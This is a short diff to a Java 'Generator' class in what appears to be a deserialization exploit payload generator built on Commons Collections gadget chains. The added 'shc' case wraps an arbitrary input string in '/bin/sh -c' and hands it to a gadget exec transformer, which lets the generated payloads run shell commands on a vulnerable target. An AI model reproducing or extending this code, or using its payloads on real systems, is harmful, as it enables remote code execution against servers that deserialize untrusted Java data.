@@ -648,6 +648,12 @@ public class Generator {
                 break;
             }
 
+            case "shc":{
+                final String[] execCmd = new String[] {"/bin/sh", "-c", stmt.getString("val")};
+                result = Commons1Gadgets.getExecTransformer(execCmd);
+                break;
+            }
+
             case "execRuntime":{
                 final Object inp = stmt.get("val");
                 if (inp instanceof JSONArray){
